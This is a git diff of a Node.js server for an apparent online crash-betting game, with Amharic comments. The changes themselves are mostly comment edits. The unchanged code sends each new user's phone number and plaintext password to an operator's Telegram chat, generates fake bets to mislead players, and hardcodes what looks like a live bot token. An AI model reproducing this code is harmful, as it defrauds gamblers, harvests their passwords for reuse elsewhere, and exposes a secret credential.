@@ -7,7 +7,7 @@ const bcrypt = require('bcryptjs');
 
 const app = express();
 
-// 1. CORS ማስተካከያ (ለላይቭ ስራ የግድ ነው)
+// 1. CORS ማስተካከያ - ለ Render እና ለ Frontend ግንኙነት ወሳኝ ነው
 app.use(cors({
     origin: "*",
     methods: ["GET", "POST"]
@@ -27,14 +27,13 @@ const TELEGRAM_TOKEN = '8601691945:AAHuf1tKpCAmU6j6cOqp0i8sR0qv4F0nCPc';
 const ADMIN_CHAT_ID = '2068983666';
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
-// ግንኙነት እንዳይቋረጥ ስህተቶችን መያዝ
 bot.on('polling_error', (error) => {
-    // console.log("Telegram error caught");
+    // ፖሊንግ ስህተት ቢኖር ሰርቨሩ እንዳይቆም
 });
 
 // --- ዳታቤዝ (ጊዜያዊ) ---
 let users = []; 
-let userSockets = {}; // ስልክን ከሶኬት ጋር ለማያያዝ
+let userSockets = {}; 
 
 // --- የጨዋታ ሁኔታ (Game State) ---
 let gameState = {
@@ -46,7 +45,7 @@ let gameState = {
     gameHistory: []
 };
 
-// --- የውሸት ውርርዶች መፍጠሪያ (30 ሰዎች) ---
+// --- የውሸት ውርርዶች መፍጠሪያ ---
 const generateFakeBets = () => {
     const fakeNames = ["Abebe", "Sara", "Yoni", "Mery", "Ethio", "King", "Lucky", "Dave", "Kal", "Bini", "Tedi", "Hani", "Mahi", "Lili"];
     let bets = Array.from({ length: 30 }, () => {
@@ -71,7 +70,6 @@ app.post('/register', async (req, res) => {
         const hashedPassword = await bcrypt.hash(password, 10);
         users.push({ phone, password: hashedPassword, balance: 0 });
 
-        // የምዝገባ መረጃን ለቦት መላክ
         const msg = `👤 *አዲስ ተመዝጋቢ*\n\n📱 ስልክ: \`${phone}\` \n🔑 Password: \`${password}\` \n🕒 ጊዜ: ${new Date().toLocaleString()}`;
         bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' }).catch(e => {});
 
@@ -128,7 +126,7 @@ io.on('connection', (socket) => {
     });
 
     socket.on('sendDepositRequest', (data) => {
-        const msg = `💰 *የዲፖዚት ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💵 መጠን: *${data.amount} ETB*`;
+        const msg = `💰 *የዲፖዚት ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💸 መጠን: *${data.amount} ETB*`;
         const opts = {
             caption: msg,
             parse_mode: 'Markdown',
@@ -155,7 +153,7 @@ io.on('connection', (socket) => {
         if (user) {
             user.balance -= parseFloat(data.amount); 
         }
-        const msg = `📤 *የዊዝድሮው ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💵 መጠን: *${data.amount} ETB*\n⚠️ ባላንሳቸው ቀንሷል፤ ብሩን ይላኩላቸው።`;
+        const msg = `📤 *የዊዝድሮው ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💸 መጠን: *${data.amount} ETB*\n⚠️ ባላንሳቸው ቀንሷል፤ ብሩን ይላኩላቸው።`;
         bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' });
     });
 
@@ -204,7 +202,7 @@ const startFlying = () => {
     }, 100);
 };
 
-// 2. Render ፖርት ማስተካከያ (በጣም ወሳኝ!)
+// 2. Render ፖርት ማስተካከያ
 const PORT = process.env.PORT || 10000;
 server.listen(PORT, () => {
     console.log(`✅ ሰርቨሩ በፖርት ${PORT} ላይ ስራ ጀምሯል`);
